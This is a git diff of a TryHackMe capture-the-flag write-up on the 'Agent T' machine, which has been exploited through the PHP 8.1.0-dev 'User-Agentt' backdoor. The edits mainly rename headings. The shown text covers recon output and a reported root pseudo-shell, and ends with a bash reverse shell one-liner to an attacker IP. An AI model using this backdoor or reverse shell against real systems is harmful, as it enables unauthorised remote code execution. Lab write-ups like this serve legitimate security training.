@@ -21,15 +21,13 @@ tags:
 -------------
 This writeup documents the penetration testing of the [**Agent T**](https://tryhackme.com/room/agentt) machine from the [**TryHackMe**](https://tryhackme.com/) platform.
 
-Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...
+Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds... 
 
 In this case we'll exploit a vulnerable PHP version.
 
 <br>
-# Recon
+# Information Gathering
 ------------------
-## Enumeration of exposed services
-----------------
 
 Once we have discovered the IP of the machine we need to enumerate as much information as possible.
 
@@ -89,10 +87,6 @@ Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
 
 The intrussion is going to be from port 80.
 
-
-## Web enumeration and fuzzing
-------------
-
 ```
 ❯ whatweb http://10.10.55.237
 http://10.10.55.237 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.55.237], JQuery, PHP[8.1.0-dev], Script, Title[Admin Dashboard], X-Powered-By[PHP/8.1.0-dev], X-UA-Compatible[IE=edge]
@@ -129,10 +123,8 @@ Look at the error. The server responds but it always responds with 200 OK... Try
 If we open Burp Suite and try to examinate the request or use some tools there we find nothing either.
 
 <br>
-# Exploitation
+# Vulnerability Assesment
 ----------
-## Identification and exploitation of vulnerabilities
--------
 
 At this point we need to search for vulnerabilities related to the version of the services, in this case, we can try with PHP.
 
@@ -148,7 +140,12 @@ PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                             
 There's an exploit for this PHP version. 
 
 An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
-The following exploit uses the backdoor to provide a pseudo shell ont the host.
+
+<br>
+# Exploitation
+-------
+
+The following exploit uses the backdoor to provide a pseudo shell in the host.
 
 ```python
 #!/usr/bin/env python3
@@ -198,8 +195,6 @@ root
 <br>
 # Post-Exploitation
 --------
-## Accessing a bash shell
-----------
 
 That was that. Simple, isn't it? We are root
 
@@ -213,7 +208,7 @@ $ pwd
 /var/www/html
 ```
 
-But we are not in an interactive tty. It's a kind of restricted shell. Let's create a simple reverse shell.
+But we are not in an interactive tty. It's a kind of **restricted shell**. Let's create a simple reverse shell.
 
 ```bash
 bash -c "bash -i >& /dev/tcp/10.8.78.182/443 0>&1"
